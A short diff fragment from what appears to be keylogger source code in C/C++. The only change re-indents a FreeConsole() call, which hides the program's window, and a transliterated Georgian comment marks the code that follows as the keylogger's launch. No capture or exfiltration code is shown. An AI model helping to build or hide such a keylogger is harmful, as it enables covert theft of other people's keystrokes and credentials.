@@ -12,7 +12,7 @@ return hfont;
 }
 void  main()
 { 
-	FreeConsole();
+			FreeConsole();
 	/////////////// keylogeris gashveba ////////////////////
 
 	
